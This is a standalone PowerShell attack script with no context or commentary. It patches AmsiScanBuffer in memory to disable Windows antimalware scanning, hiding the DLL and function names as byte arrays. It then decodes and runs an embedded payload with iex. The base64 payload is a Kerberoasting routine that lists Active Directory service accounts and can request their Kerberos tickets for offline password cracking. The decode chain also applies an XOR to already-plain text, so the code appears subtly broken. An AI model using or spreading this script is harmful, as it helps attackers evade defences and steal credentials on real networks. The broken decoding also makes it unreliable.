
$Win32 = @"
using System;
using System.Runtime.InteropServices;

public class Win32 {

    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

}
"@

Add-Type $Win32
$test = [Byte[]](0x61, 0x6d, 0x73, 0x69, 0x2e, 0x64, 0x6c, 0x6c)
$LoadLibrary = [Win32]::LoadLibrary([System.Text.Encoding]::ASCII.GetString($test))
$test2 = [Byte[]] (0x41, 0x6d, 0x73, 0x69, 0x53, 0x63, 0x61, 0x6e, 0x42, 0x75, 0x66, 0x66, 0x65, 0x72)
$Address = [Win32]::GetProcAddress($LoadLibrary, [System.Text.Encoding]::ASCII.GetString($test2))
$p = 0
[Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)
$Patch = [Byte[]] (0x31, 0xC0, 0x05, 0x78, 0x01, 0x19, 0x7F, 0x05, 0xDF, 0xFE, 0xED, 0x00, 0xC3)
#0:  31 c0                   xor    eax,eax
#2:  05 78 01 19 7f          add    eax,0x7f190178
#7:  05 df fe ed 00          add    eax,0xedfedf
#c:  c3                      ret 
#for ($i=0; $i -lt $Patch.Length;$i++){$Patch[$i] = $Patch[$i] -0x2}
[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, $Patch.Length)

$enc = [system.Text.Encoding]::UTF8


$EncodedText = "W0NtZGxldEJpbmRpbmcoKV0KUGFyYW0oCiAgW1BhcmFtZXRlcihNYW5kYXRvcnk9JEZhbHNlLFBvc2l0aW9uPTEpXSBbc3RyaW5nXSRHQ05hbWUsCiAgW1BhcmFtZXRlcihNYW5kYXRvcnk9JEZhbHNlKV0gW3N0cmluZ10kRmlsdGVyLAogIFtQYXJhbWV0ZXIoTWFuZGF0b3J5PSRGYWxzZSldIFtzd2l0Y2hdJFJlcXVlc3QsCiAgW1BhcmFtZXRlcihNYW5kYXRvcnk9JEZhbHNlKV0gW3N3aXRjaF0kVW5pcXVlQWNjb3VudHMKKQoKQWRkLVR5cGUgLUFzc2VtYmx5TmFtZSBTeXN0ZW0uSWRlbnRpdHlNb2RlbAoKJEdDcyA9IEAoKQoKSWYgKCRHQ05hbWUpIHsKICAkR0NzICs9ICRHQ05hbWUKfSBlbHNlIHsgIyBmaW5kIHRoZW0KICAkRm9yZXN0SW5mbyA9IFtTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuQWN0aXZlRGlyZWN0b3J5LkZvcmVzdF06OkdldEN1cnJlbnRGb3Jlc3QoKQogICRDdXJyZW50R0NzID0gJEZvcmVzdEluZm8uRmluZEFsbEdsb2JhbENhdGFsb2dzKCkKICBGb3JFYWNoICgkR0MgaW4gJEN1cnJlbnRHQ3MpIHsKICAgICMkR0NzICs9ICRHQy5OYW1lCiAgICAkR0NzICs9ICRGb3Jlc3RJbmZvLkFwcGxpY2F0aW9uUGFydGl0aW9uc1swXS5TZWN1cml0eVJlZmVyZW5jZURvbWFpbgogIH0KfQoKaWYgKC1ub3QgJEdDcykgewogICMgbm8gR2xvYmFsIENhdGFsb2dzIEZvdW5kCiAgV3JpdGUtSG9zdCAiTm8gR2xvYmFsIENhdGFsb2dzIEZvdW5kISIKICBFeGl0Cn0KCkZvckVhY2ggKCRHQyBpbiAkR0NzKSB7CiAgICAkc2VhcmNoZXIgPSBOZXctT2JqZWN0IFN5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5EaXJlY3RvcnlTZWFyY2hlcgogICAgJHNlYXJjaGVyLlNlYXJjaFJvb3QgPSAiTERBUDovLyIgKyAkR0MKICAgICRzZWFyY2hlci5QYWdlU2l6ZSA9IDEwMDAKICAgICRzZWFyY2hlci5GaWx0ZXIgPSAiKCYoIW9iamVjdENsYXNzPWNvbXB1dGVyKShzZXJ2aWNlUHJpbmNpcGFsTmFtZT0qKSkiCiAgICAkc2VhcmNoZXIuUHJvcGVydGllc1RvTG9hZC5BZGQoInNlcnZpY2VwcmluY2lwYWxuYW1lIikgfCBPdXQtTnVsbAogICAgJHNlYXJjaGVyLlByb3BlcnRpZXNUb0xvYWQuQWRkKCJuYW1lIikgfCBPdXQtTnVsbAogICAgJHNlYXJjaGVyLlByb3BlcnRpZXNUb0xvYWQuQWRkKCJzYW1hY2NvdW50bmFtZSIpIHwgT3V0LU51bGwKICAgICMkc2VhcmNoZXIuUHJvcGVydGllc1RvTG9hZC5BZGQoInVzZXJwcmluY2lwYWxuYW1lIikgfCBPdXQtTnVsbAogICAgIyRzZWFyY2hlci5Qcm9wZXJ0aWVzVG9Mb2FkLkFkZCgiZGlzcGxheW5hbWUiKSB8IE91dC1OdWxsCiAgICAkc2VhcmNoZXIuUHJvcGVydGllc1RvTG9hZC5BZGQoIm1lbWJlcm9mIikgfCBPdXQtTnVsbAogICAgJHNlYXJjaGVyLlByb3BlcnRpZXNUb0xvYWQuQWRkKCJwd2RsYXN0c2V0IikgfCBPdXQtTnVsbAogICAgIyRzZWFyY2hlci5Qcm9wZXJ0aWVzVG9Mb2FkLkFkZCgiZGlzdGluZ3Vpc2hlZG5hbWUiKSB8IE91dC1OdWxsCgogICAgJHNlYXJjaGVyLlNlYXJjaFNjb3BlID0gIlN1YnRyZWUiCgogICAgJHJlc3VsdHMgPSAkc2VhcmNoZXIuRmluZEFsbCgpCiAgICAKICAgIFtTeXN0ZW0uQ29sbGVjdGlvbnMuQXJyYXlMaXN0XSRhY2NvdW50cyA9IEAoKQogICAgICAgIAogICAgZm9yZWFjaCAoJHJlc3VsdCBpbiAkcmVzdWx0cykgewogICAgICAgIGZvcmVhY2ggKCRzcG4gaW4gJHJlc3VsdC5Qcm9wZXJ0aWVzWyJzZXJ2aWNlcHJpbmNpcGFsbmFtZSJdKSB7CiAgICAgICAgICAgICRvID0gU2VsZWN0LU9iamVjdCAtSW5wdXRPYmplY3QgJHJlc3VsdCAtUHJvcGVydHkgYAogICAgICAgICAgICAgICAgQHtOYW1lPSJTZXJ2aWNlUHJpbmNpcGFsTmFtZSI7IEV4cHJlc3Npb249eyRzcG4uVG9TdHJpbmcoKX0gfSwgYAogICAgICAgICAgICAgICAgQHtOYW1lPSJOYW1lIjsgICAgICAgICAgICAgICAgIEV4cHJlc3Npb249eyRyZXN1bHQuUHJvcGVydGllc1sibmFtZSJdWzBdLlRvU3RyaW5nKCl9IH0sIGAKICAgICAgICAgICAgICAgICNAe05hbWU9IlVzZXJQcmluY2lwYWxOYW1lIjsgICBFeHByZXNzaW9uPXskcmVzdWx0LlByb3BlcnRpZXNbInVzZXJwcmluY2lwYWxuYW1lIl1bMF0uVG9TdHJpbmcoKX0gfSwgYAogICAgICAgICAgICAgICAgQHtOYW1lPSJTQU1BY2NvdW50TmFtZSI7ICAgICAgIEV4cHJlc3Npb249eyRyZXN1bHQuUHJvcGVydGllc1sic2FtYWNjb3VudG5hbWUiXVswXS5Ub1N0cmluZygpfSB9LCBgCiAgICAgICAgICAgICAgICAjQHtOYW1lPSJEaXNwbGF5TmFtZSI7ICAgICAgICAgRXhwcmVzc2lvbj17JHJlc3VsdC5Qcm9wZXJ0aWVzWyJkaXNwbGF5bmFtZSJdWzBdLlRvU3RyaW5nKCl9IH0sIGAKICAgICAgICAgICAgICAgIEB7TmFtZT0iTWVtYmVyT2YiOyAgICAgICAgICAgICBFeHByZXNzaW9uPXskcmVzdWx0LlByb3BlcnRpZXNbIm1lbWJlcm9mIl1bMF0uVG9TdHJpbmcoKX0gfSwgYAogICAgICAgICAgICAgICAgQHtOYW1lPSJQYXNzd29yZExhc3RTZXQiOyAgICAgIEV4cHJlc3Npb249e1tkYXRldGltZV06OmZyb21GaWxlVGltZSgkcmVzdWx0LlByb3BlcnRpZXNbInB3ZGxhc3RzZXQiXVswXSl9IH0gIywgYAogICAgICAgICAgICAgICAgI0B7TmFtZT0iRGlzdGluZ3Vpc2hlZE5hbWUiOyAgIEV4cHJlc3Npb249eyRyZXN1bHQuUHJvcGVydGllc1siZGlzdGluZ3Vpc2hlZG5hbWUiXVswXS5Ub1N0cmluZygpfSB9CiAgICAgICAgICAgIGlmICgkVW5pcXVlQWNjb3VudHMpIHsKICAgICAgICAgICAgICAgIGlmICgtbm90ICRhY2NvdW50cy5Db250YWlucygkcmVzdWx0LlByb3BlcnRpZXNbInNhbWFjY291bnRuYW1lIl1bMF0uVG9TdHJpbmcoKSkpIHsKICAgICAgICAgICAgICAgICAgICAkYWNjb3VudHMuQWRkKCRyZXN1bHQuUHJvcGVydGllc1sic2FtYWNjb3VudG5hbWUiXVswXS5Ub1N0cmluZygpKSB8IE91dC1OdWxsCiAgICAgICAgICAgICAgICAgICAgJG8KICAgICAgICAgICAgICAgICAgICBpZiAoJFJlcXVlc3QpIHsKICAgICAgICAgICAgICAgICAgICAgICAgTmV3LU9iamVjdCBTeXN0ZW0uSWRlbnRpdHlNb2RlbC5Ub2tlbnMuS2VyYmVyb3NSZXF1ZXN0b3JTZWN1cml0eVRva2VuIC1Bcmd1bWVudExpc3QgJHNwbi5Ub1N0cmluZygpIHwgT3V0LU51bGwKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAkbwogICAgICAgICAgICAgICAgaWYgKCRSZXF1ZXN0KSB7CiAgICAgICAgICAgICAgICAgICAgTmV3LU9iamVjdCBTeXN0ZW0uSWRlbnRpdHlNb2RlbC5Ub2tlbnMuS2VyYmVyb3NSZXF1ZXN0b3JTZWN1cml0eVRva2VuIC1Bcmd1bWVudExpc3QgJHNwbi5Ub1N0cmluZygpIHwgT3V0LU51bGwKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KfQo="

$file = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($EncodedText))
$data = $enc.GetBytes($file)|%{$_-bXor0x11}
iex ([System.Text.Encoding]::ASCII.GetString($data))

